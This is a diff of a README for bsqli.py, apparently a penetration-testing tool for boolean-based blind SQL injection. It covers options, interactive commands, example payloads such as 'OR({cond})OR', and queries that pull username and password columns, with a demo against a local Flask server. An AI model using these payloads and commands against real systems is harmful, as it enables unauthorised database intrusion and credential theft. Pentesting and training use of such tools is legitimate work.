@@ -1,5 +1,5 @@
 # bsqli.py
-A nifty little boolean-based blind SQLi script for OSCP and real-life engagements.
+A nifty little interactive, multi-threaded, boolean-based blind SQLi script for OSCP, CTF, and real-life engagements.
 
 This tool abstracts the tedious process of brute-forcing strings; and is primarily used to enumerate metadata (SQL version, DB name, host name) and tables. For instance, there may be some juicy credentials residing in some user table. Or we may want to simply perform a Proof-of-Concept for a client by grabbing the version banner.
 
@@ -19,10 +19,10 @@ Check out [my writeup which reviews boolean-based SQLi and explores some exploit
 
 ## Install ##
 
-This script requires Python 3.10+, requests, rich, and prompt_toolkit.
+This script requires Python 3.10+, urllib3, requests, rich, and prompt_toolkit.
 
 ```shell
-pip install requests rich prompt_toolkit
+pip install urllib3 requests rich prompt_toolkit
 ```
 
 Apart from that, just download/copy the file and you should be good to go!
@@ -61,60 +61,59 @@ Apart from that, just download/copy the file and you should be good to go!
 ```txt
 options:
   -h, --help            show this help message and exit
-  --docs                Extensive documentation on installation, usage, and examples. (default: False)
   -V, --version         Print script version (default: False)
-
-  -u URL, --url URL     The url to scan, with the scheme (e.g. http://192.168.1.1/admin). Possibly
-                        containing an injection point marked with `{payload}`. (default: None)
-  --data DATA           Url-encoded data to send with the request. Possibly containing an injection
-                        point marked with `{payload}`. (default: )
+  -u URL, --url URL     The url to scan, with the scheme (e.g. http://192.168.1.1/admin). Possibly  
+                        containing an injection point marked with `{payload}`. (default: None)      
+  --data DATA           Url-encoded data to send with the request. Possibly containing an
+                        injection point marked with `{payload}`. (default: )
   -X {GET,POST}, --method {GET,POST}
                         GET or POST (default: GET)
   -H HEADER, --header HEADER
                         Extra headers to send with requests. (default: [])
   --timeout TIMEOUT     Timeout of each request. (default: 5)
   --payload PAYLOAD     The SQLi payload. (default: None)
-
-  --proxy PROXY         Send requests to a proxy. Example: http://127.0.0.1:8080. (default: None)
+  --proxy PROXY         Send requests to a proxy. Example: http://127.0.0.1:8080. (default: None)   
   --follow-redirects    Follows redirects in responses. (default: False)
   --max-retries MAX_RETRIES
-                        Maximum number of connection retries to attempt. (default: 3)
-
+                        Maximum number of HTTP connection retries to attempt. (default: 3)
   --dbms {MySQL,SQLServer,SQLite,OracleSQL}
                         The database management system. (default: None)
-  --strategy {B}        The strategy to use: Boolean. You don't have any other choice at this moment.
-                        (default: B)
+  --strategy {B}        The strategy to use: Boolean. You don't have any other choice at this       
+                        moment. (default: B)
   -t THREADS, --threads THREADS
                         Number of threads to use. (default: 8)
-
+  -d DELAY, --delay DELAY
+                        Number of seconds to delay each thread between requests. (default: 0)       
   -v                    Verbosity. -v for INFO, -vv for DEBUG messages. (default: 0)
-
   -bts BOOLEAN_TRUE_IF_STATUS, --boolean-true-if-status BOOLEAN_TRUE_IF_STATUS
-                        If the response returns the provided status, mark the response as TRUE. All
-                        other statuses are FALSE. (default: None)
+                        If the response returns the provided status, mark the response as TRUE.     
+                        All other statuses are FALSE. (default: None)
   -bfs BOOLEAN_FALSE_IF_STATUS, --boolean-false-if-status BOOLEAN_FALSE_IF_STATUS
-                        If the response returns the provided status, mark the response as FALSE. All
-                        other statuses are TRUE. (default: None)
+                        If the response returns the provided status, mark the response as FALSE.    
+                        All other statuses are TRUE. (default: None)
   -bttc BOOLEAN_TRUE_IF_TEXT_CONTAINS, --boolean-true-if-text-contains BOOLEAN_TRUE_IF_TEXT_CONTAINS
-                        If the response text contains the provided text, mark the response as TRUE.
-                        Otherwise, FALSE. (default: None)
+                        If the response text contains the provided text, mark the response as       
+                        TRUE. Otherwise, FALSE. (default: None)
   -bftc BOOLEAN_FALSE_IF_TEXT_CONTAINS, --boolean-false-if-text-contains BOOLEAN_FALSE_IF_TEXT_CONTAINS
-                        If the response text contains the provided text, mark the response as FALSE.
-                        Otherwise, TRUE. (default: None)
+                        If the response text contains the provided text, mark the response as       
+                        FALSE. Otherwise, TRUE. (default: None)
   -bes BOOLEAN_ERROR_IF_STATUS, --boolean-error-if-status BOOLEAN_ERROR_IF_STATUS
-                        If the provided statuses are encountered, mark the query as an error. Accepts
-                        multiple arguments (e.g. -bes 400, -bes 401). (default: [])
+                        If the provided statuses are encountered, mark the query as an error.       
+                        Accepts multiple arguments (e.g. -bes 400, -bes 401). (default: [])
   -betc BOOLEAN_ERROR_IF_TEXT_CONTAINS, --boolean-error-if-text-contains BOOLEAN_ERROR_IF_TEXT_CONTAINS
-                        If the provided text is encountered in the response body, mark the query as an
-                        error. Accepts multiple arguments. (default: [])
-  -betn BOOLEAN_ERROR_IF_TEXT_NOT_CONTAINS, --boolean-error-if-text-not-contains BOOLEAN_ERROR_IF_TEXT_NOT_CONTAINS
-                        If the provided text was NOT encountered in the response body, mark the query
+                        If the provided text is encountered in the response body, mark the query    
                         as an error. Accepts multiple arguments. (default: [])
-
-  --cast-to-string      Cast the target output to varchar(2048) string. This allows numbers to be
-                        output as well, since normally we can't SUBSTRING a number. (default: False)
+  -betn BOOLEAN_ERROR_IF_TEXT_NOT_CONTAINS, --boolean-error-if-text-not-contains BOOLEAN_ERROR_IF_TEXT_NOT_CONTAINS
+                        If the provided text was NOT encountered in the response body, mark the     
+                        query as an error. Accepts multiple arguments. (default: [])
+  --max-retries-on-error MAX_RETRIES_ON_ERROR
+                        Maximum number of retries if a response is marked as an error. (default:    
+                        3)
+  --cast-to-string      Cast the target output to varchar(2048) string. This allows numbers and     
+                        other data types to be treated as strings, so that our standard ASCII-      
+                        SUBSTRING algorithm can work. (default: False)
   --cast-to-string-length CAST_TO_STRING_LENGTH
-                        The length of the string to cast to. If you specify this, you should also
+                        The length of the string to cast to. If you specify this, you should also   
                         enable --cast-to-string. (default: 2048)
 ```
 
@@ -159,12 +158,43 @@ Upon entering the CLI, you have some options.
    col> concat(id,0x7c,username,0x7c,password,0x7c,firstname,0x7c,lastname,0x7c,created_on)
    ```
 
-3. Run a custom query.
+3. Or if you want to go full Rambo with guns ablazing, use your own custom query. All queries are wrapped in a subquery.
 
    ```
    sqli> SELECT 1
    sqli> SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='admin'
    ```
+
+### Interactive Help
+
+```
+sqli> help
+Commands:
+ help          - this menu
+ q/quit/Ctrl+D - exit program
+ c/config      - configure settings dynamically
+
+To pause the program during a run, hit Ctrl+C. This enters config mode.
+Then enter 'c'/'continue' to resume execution, or 'q'/'quit' to cancel.
+
+Common SQL Commands:
+ v     - version
+ u     - current user
+ d     - database name
+ h     - host name
+ s     - server name
+ check - verify TRUE/FALSE responses are correctly received
+ t     - enumerate a table and column one row at a time (slow)
+
+You can also run any subquery-able SQL command by inputting raw SQL directly, e.g.
+sqli> SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES
+
+Note that the query should return 1 row and 1 column.
+SQL concat/aggregation functions will help you out here.
+e.g. JSON_ARRAYAGG / GROUP_CONCAT in MySQL
+     LISTAGG                      in OracleSQL
+     CONCAT / CONCAT_WS           for multiple columns
+```
 
 
 ## Examples ##
@@ -239,3 +269,26 @@ python bsqli.py \
     -bts 302 -bes 500
 ```
     
+### Demo Server ###
+
+Try the script on the demo server (requires Python and Flask, `pip install flask`).
+
+Clone the repo and run the following commands in two separate terminals:
+```sh
+python demo/server.py 127.0.0.1 8081
+python ./bsqli.py -u http://127.0.0.1:8081/login -X POST -bttc success --dbms SQLite -t 1 --payload "'OR({cond})OR'" --data 'username={payload}&password='
+```
+
+Then run sqli commands:
+
+```
+sqli> v
+
+3.37.2
+```
+
+```
+sqli> SELECT GROUP_CONCAT(name, ',') FROM sqlite_master WHERE type='table'
+
+users,flags
+```
